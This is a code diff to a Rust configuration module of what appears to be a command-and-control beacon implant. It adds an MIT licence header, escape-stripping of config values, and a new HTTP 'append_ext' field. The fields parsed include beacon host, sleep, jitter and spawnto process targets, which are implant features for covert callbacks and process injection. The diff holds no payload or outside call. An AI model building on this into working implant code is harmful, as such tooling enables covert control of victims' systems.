@@ -1,3 +1,23 @@
+// Copyright (c) 2024 ThottySploity
+
+// Permission is hereby granted, free of charge, to any person obtaining a copy
+// of this software and associated documentation files (the "Software"), to deal
+// in the Software without restriction, including without limitation the rights
+// to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
+// copies of the Software, and to permit persons to whom the Software is
+// furnished to do so, subject to the following conditions:
+
+// The above copyright notice and this permission notice shall be included in all
+// copies or substantial portions of the Software.
+
+// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
+// IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
+// FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
+// AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
+// LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
+// OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
+// SOFTWARE.
+
 use crate::communication::{
     HttpConfiguration, 
     PipeConfiguration, 
@@ -58,23 +78,23 @@ impl Configuration {
 
     // Extract the configuration and populate the Configuration and BeaconCom structs
     pub fn new() -> Self {
-
+        
         if let Ok(config) = decrypt_configuration() {
             return Self {
                 beacon: BeaconCom {
-                    host: config["beacon"]["host"].to_string(),
-                    port: config["beacon"]["port"].to_string(),
-                    method: config["beacon"]["method"].to_string(),
+                    host: Utilities::strip_escape_chars(config["beacon"]["host"].to_string()),
+                    port: Utilities::strip_escape_chars(config["beacon"]["port"].to_string()),
+                    method: Utilities::strip_escape_chars(config["beacon"]["method"].to_string()),
                     methodinfo: parse_method_info(&config["beacon"]["method"], &config["beacon_type"]["methodinfo"]),
                 },
-                sleeptime: config["sleeptime"].to_string(),
-                jitter: config["jitter"].to_string(),
-                pubkey: config["pubkey"].to_string(),
+                sleeptime: Utilities::strip_escape_chars(config["sleeptime"].to_string()),
+                jitter: Utilities::strip_escape_chars(config["jitter"].to_string()),
+                pubkey: Utilities::strip_escape_chars(config["pubkey"].to_string()),
                 aes_key: [0u8; 32],
                 pid: "".to_string(),
-                spawnto_x64: config["spawnto_x64"].to_string(),
-                spawnto_x32: config["spawnto_x32"].to_string(),
-            }
+                spawnto_x64: Utilities::strip_escape_chars(config["spawnto_x64"].to_string()),
+                spawnto_x32: Utilities::strip_escape_chars(config["spawnto_x32"].to_string()),
+            };
         }
 
         // If the configuration cannot be decrypted, there is not much we can do.
@@ -91,7 +111,8 @@ fn parse_method_info(method: &serde_json::Value, methodinfo: &serde_json::Value)
             headers: methodinfo["headers"].as_array().map_or_else(Vec::new, |arr| {
                 arr.iter().map(|v| v.to_string()).collect()
             }),
-            uri_append: methodinfo["append"].to_string(),
+            append_ext: methodinfo["append_ext"].to_string(),
+            uri_append: methodinfo["uri_append"].to_string(),
         }),
         Some("pipe") => CommunicationMethod::Pipe(PipeConfiguration {
             pipename: methodinfo["pipename"].to_string(),
